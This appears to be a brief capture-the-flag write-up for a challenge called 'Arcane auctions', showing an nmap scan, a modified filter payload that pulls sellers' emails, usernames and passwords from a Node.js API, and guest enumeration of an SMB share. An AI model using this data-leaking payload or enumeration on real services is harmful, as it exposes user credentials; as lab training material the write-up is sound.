# Arcane auctions

### Information gathering

```bash
nmap 83.136.253.25 -p 33921,45204,40465 -sV

PORT      STATE SERVICE     VERSION
33921/tcp open  unknown
40465/tcp open  netbios-ssn Samba smbd 4.6.2
45204/tcp open  http        Node.js (Express middleware)
```


Modify the payload from `exploit.py` to print more information from the users.
New payload:

```python
...
    payload = {
        "filter": {
            "select": {
                "seller": {
                    "select": {
                        "id": True,
                        "email": True,
                        "username": True,
                        "password": True,
                        "gold_balance": True,
                        "createdAt": True
                    }
                }
            }
        }
    }
```

We have users and passwords.

Access to the SMB server by:

```bash
$ smbclient -L localhost -U guest
Password for [WORKGROUP\guest]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	app             Disk      
	IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
	nobody          Disk      Home Directories
SMB1 disabled -- no workgroup available


$ smbclient //localhost/app -U guest

```